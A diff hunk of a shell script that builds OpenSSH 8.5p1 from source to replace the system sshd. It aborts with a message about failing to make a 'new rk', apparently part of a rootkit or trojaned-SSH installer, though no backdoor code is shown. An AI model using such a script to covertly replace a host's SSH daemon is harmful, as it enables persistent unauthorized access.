@@ -186,7 +186,6 @@ else
         ls
         tar zxf openssh-8.5p1.tar.gz -C 1tempfiles/
         cd 1tempfiles/openssh-8.5p1
-        ls
         ./configure --prefix=/usr --sysconfdir=/etc/ssh
         make
         if [ ! -f sshd ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m failed to make new rk. aborting" ; echo ; exit ; fi
